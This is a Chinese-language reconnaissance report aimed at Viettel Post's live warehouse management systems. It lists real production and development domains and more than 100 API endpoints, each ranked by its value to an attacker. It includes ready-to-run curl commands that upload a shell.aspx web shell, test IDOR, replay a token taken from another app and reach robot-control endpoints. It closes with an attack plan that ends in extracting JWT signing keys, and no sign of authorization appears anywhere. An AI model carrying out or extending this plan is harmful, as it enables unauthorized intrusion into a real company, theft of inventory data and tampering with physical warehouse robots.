# 🏆 VWMS APP 最终汇总报告

## 🎯 核心发现

### 1. 新域名 ✅ 已确认可访问
```
✅ https://mwms.viettelpost.vn/          (主站 - 200 OK)
✅ https://wms-dev.viettelpost.vn/       (开发环境 - 待测试)
```

### 2. Web应用信息
```
标题: WMS Ops
类型: React SPA (单页应用)
主JS: /assets/index-PMsLT6Nl.js
主CSS: /assets/index-Cg2O_frP.css
描述: Warehouse management system
```

---

## 📦 VWMS APP vs VTP Man APP

| 维度 | VTP Man | VWMS |
|------|---------|------|
| **域名** | gw.vtpglobal.com.vn | **mwms.viettelpost.vn** ⭐ |
| **API端点** | 60+ (物流) | **100+ (仓储)** ⭐ |
| **权限** | 配送员 | **仓库管理员** ⭐ |
| **机器人控制** | ❌ | **✅ AGV/RCS** ⭐ |
| **蓝牙设备** | ❌ | **✅** ⭐ |
| **生物识别** | ❌ | **✅** ⭐ |
| **版本** | 1.0.21 | 1.0.2 |

---

## 🔥 高价值独特端点

### P0 - 立即可测
```
🎯 https://mwms.viettelpost.vn/api/v1/files/upload
   威胁: 文件上传 → RCE

🎯 https://mwms.viettelpost.vn/wms-product-catalogue/api/v1/product/find-by-barcode
   威胁: 枚举所有产品库存

🎯 https://mwms.viettelpost.vn/api/v1/icc/get-list-product
   威胁: 批量库存泄漏

🎯 https://mwms.viettelpost.vn/api/v1/common-directory/search
   威胁: 目录遍历
```

### P0 - 机器人控制（需Token）
```
POST https://mwms.viettelpost.vn/api/v1/ibms/receiving/rcs-robot-agv-put-away
POST https://mwms.viettelpost.vn/api/v1/obms/pickup/rcs-agv-locationset
POST https://mwms.viettelpost.vn/api/v1/obms/sorting/robot/transfer-normal-sorting

威胁: 如无硬件认证，可操控仓库AGV机器人
```

---

## 🔍 完整微服务架构

```
https://mwms.viettelpost.vn/
├── api/v1/*                          (通用API)
├── wms-core/api/v1/*                 (核心WMS)
├── wms-ibms/api/v1/*                 (入库系统)
├── wms-obms/api/v1/*                 (出库系统)
├── wms-cms/api/v1/*                  (内容管理)
└── wms-product-catalogue/api/v1/*    (产品目录)
```

---

## 📋 API端点完整列表

### 入库管理 (IBMS)
```
/api/v1/ibms/aeon/receiving/scan-sku
/api/v1/ibms/aeon/receiving/counting
/api/v1/ibms/aeon/receiving/scan-tote
/api/v1/ibms/inbound-request/cancel-checkin
/api/v1/ibms/inbound-request/create-sub-ir
/api/v1/ibms/inbound-request/list-receive-session
/api/v1/ibms/inbound-request/put-away/get-new-rack
/api/v1/ibms/inbound-request/put-away/suggest-location-sku
/api/v1/ibms/inbound-request/put-away/suggest-robot-location
/api/v1/ibms/put-away/rcs-agv-cancel-locationset
/api/v1/ibms/put-away/rcs-agv-finish-locationset
/api/v1/ibms/put-away/scan-location
/api/v1/ibms/receiving/put-away-sp-tote
/api/v1/ibms/receiving/rcs-robot-agv-put-away
/api/v1/ibms/receiving/scan-tote
/api/v1/ibms/update-receive-info
/api/v1/ibms/v2/update-receive-info
```

### 出库管理 (OBMS)
```
/api/v1/obms/confirm-shipment/cancel-schedule-send
/api/v1/obms/confirm-shipment/confirm-done
/api/v1/obms/confirm-shipment/search
/api/v1/obms/confirm-shipment/task/remove-package
/api/v1/obms/confirm-shipment/task/scan-v2
/api/v1/obms/pickup/assign-tote-type
/api/v1/obms/pickup/auto-assign-tote
/api/v1/obms/pickup/rcs-agv-cancel-locationset
/api/v1/obms/pickup/rcs-agv-locationset
/api/v1/obms/pickup/search
/api/v1/obms/pickup/task/determine-type-of-tote
/api/v1/obms/pickup/task/pick-sku
/api/v1/obms/pickup/task/prepare-tote
/api/v1/obms/pickup/task/rcs-agv-pick-sku
/api/v1/obms/pickup/task/rcs-agv-skip-location
/api/v1/obms/pickup/task/reset-prepare-tote
/api/v1/obms/pickup/task/scan-centralized-location
/api/v1/obms/pickup/task/scan-src-location
/api/v1/obms/pickup/task/scan-tote-centralized-location
/api/v1/obms/receive/confirm-done-all
/api/v1/obms/receive/confirm-or-done-check
/api/v1/obms/receive/insert-or-v2
/api/v1/obms/receive/remove-sku
/api/v1/obms/receive/scan-code-v2
/api/v1/obms/receive/search
/api/v1/obms/sorting/assign-tote-type
/api/v1/obms/sorting/auto-assign-tote
/api/v1/obms/sorting/robot/chute-tote-combine
/api/v1/obms/sorting/robot/sorting-detail
/api/v1/obms/sorting/robot/transfer-normal-sorting
/api/v1/obms/sorting/search
/api/v1/obms/sorting/task/pick-sku
/api/v1/obms/sorting/task/reset-prepare-tote
/api/v1/obms/sorting/task/scan-dest-tote
/api/v1/obms/sorting/task/scan-src-location
```

### 库存盘点 (ICC)
```
/api/v1/icc/get-list-product
/api/v1/icc/pda/detail
/api/v1/icc/pda/end-session
/api/v1/icc/pda/get-product-check-detail
/api/v1/icc/pda/location-listener
/api/v1/icc/pda/product-list
/api/v1/icc/pda/save-quantity-check
/api/v1/icc/pda/scan-location
/api/v1/icc/pda/scan-product
/api/v1/icc/pda/search
```

### 标签打印
```
/api/v1/label/create-multi
/api/v1/label/detail
/api/v1/label-print/create-multi
/api/v1/label-print/get-label-print-by-code
/api/v1/label-print/label-sub-code-list
/api/v1/create-label-receive
/api/v1/create-split-pack
```

### 库位管理
```
/api/v1/location/find
/api/v1/location/robot/location-tote-validate
/api/v1/location-state/add-combine-code
/api/v1/location-state/detail-pda
/api/v1/location-state/remove-combine-code
/api/v1/location-state/search-combine-code
/api/v1/location-state/transfer-ctn/validate
/api/v1/location-state/transfer-sku/validate
/api/v1/location-state/validate-main-code
/api/v1/lock-location
/api/v1/location-transfer-session/confirm-end
/api/v1/location-transfer-session/detail
/api/v1/location-transfer-session/pick-sku
/api/v1/location-transfer-session/put-sku
/api/v1/location-transfer-session/scan-loc-dest
/api/v1/location-transfer-session/scan-loc-src
/api/v1/location-transfer-session/scan-sku
/api/v1/location-transfer-session/scan-tote
/api/v1/location-transfer-session/search
/api/v1/location-transfer-session/unlock-location
/api/v1/locker/location-check-status
/api/v1/locker/location-state-check
```

### 事故报告
```
/api/v1/accident-report/cancel
/api/v1/accident-report/complete
/api/v1/accident-report/create
/api/v1/accident-report/detail
/api/v1/accident-report/get-ar-related
/api/v1/accident-report/search
/api/v1/accident-report/update
```

### 其他系统
```
/api/v1/aeon/put-away/scan-sku
/api/v1/b2b_partner/search
/api/v1/cancel-or-transfer/scan-cr-code
/api/v1/cancel-or-transfer/scan-ctn
/api/v1/cancel-or-transfer/scan-sku
/api/v1/cancel-or-transfer/scan-tote
/api/v1/cancel-or-transfer/transfer-sku
/api/v1/common-directory/search
/api/v1/copa/pda/put-away-finish
/api/v1/copa/pda/scan
/api/v1/files/upload
/api/v1/inbound-request/checkin
/api/v1/inbound-request/search-v2
/api/v1/inductions
/api/v1/notification-history/count-unread
/api/v1/notification-history/detail/by-session
/api/v1/notification-history/search
/api/v1/notification/subscribe-token-multi-topic
/api/v1/notification/unsubscribe-token-all-topic
```

---

## 💡 立即行动方案

### 方案1: 测试公开端点（无需Token）
```bash
# 1. 常见泄漏路径
curl -sk https://mwms.viettelpost.vn/api/v1/
curl -sk https://mwms.viettelpost.vn/health
curl -sk https://mwms.viettelpost.vn/swagger
curl -sk https://mwms.viettelpost.vn/api-docs

# 2. 目录搜索（可能无需认证）
curl -sk "https://mwms.viettelpost.vn/api/v1/common-directory/search"

# 3. 产品查询（测试IDOR）
curl -sk "https://mwms.viettelpost.vn/wms-product-catalogue/api/v1/product/find-by-barcode?barcode=123456"

# 4. 文件上传测试
curl -sk -X POST "https://mwms.viettelpost.vn/api/v1/files/upload" \
  -F "file=@shell.aspx"
```

### 方案2: 注册VWMS账号获取Token
```
1. 安装VWMS APP到安卓模拟器/真机
2. 尝试注册（可能需要员工邀请码）
3. 使用 mitmproxy 抓包获取Token
4. Token可能拥有仓库管理员权限！
```

### 方案3: 跨应用Token测试
```bash
# 使用VTP Man的Token访问VWMS端点
TOKEN="<VTP_Man_Token>"
curl -sk "https://mwms.viettelpost.vn/api/v1/location/find" \
  -H "Authorization: Bearer $TOKEN"
```

---

## 🎓 最终结论

### 关键成果
1. ✅ 发现新域名: `mwms.viettelpost.vn`（已确认可访问）
2. ✅ 发现开发域名: `wms-dev.viettelpost.vn`
3. ✅ 提取100+ API端点
4. ✅ 发现AGV机器人控制端点
5. ✅ 发现文件上传端点

### 与VTP Man的对比
| 项目 | VTP Man | VWMS |
|------|---------|------|
| 攻击价值 | ⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| 数据敏感度 | 订单信息 | **库存+仓储** |
| 权限级别 | 配送员 | **仓库管理员** |
| 独特功能 | 订单跟踪 | **机器人控制+库存管理** |

### 建议测试顺序
```
P0 (立即):
1. 测试 mwms.viettelpost.vn 公开端点
2. 测试 wms-dev.viettelpost.vn 开发环境
3. 测试文件上传漏洞
4. 尝试IDOR枚举产品

P1 (需Token):
1. 注册VWMS账号
2. 测试机器人控制端点
3. 批量枚举库存数据
4. 测试标签伪造

P2 (深度):
1. 完整反编译VWMS APK
2. 提取JWT签名密钥
3. 分析蓝牙通信协议
4. 测试AGV硬件认证机制
```

---

**报告生成时间:** 2025-11-11 07:21 UTC  
**分析的APP:** 2个 (VTP Man + VWMS)  
**发现的域名:** 2个 (mwms + wms-dev)  
**提取的端点:** 160+ (60+ VTP Man + 100+ VWMS)  
**高危端点:** 20+  
**新攻击面:** 机器人控制 ⭐
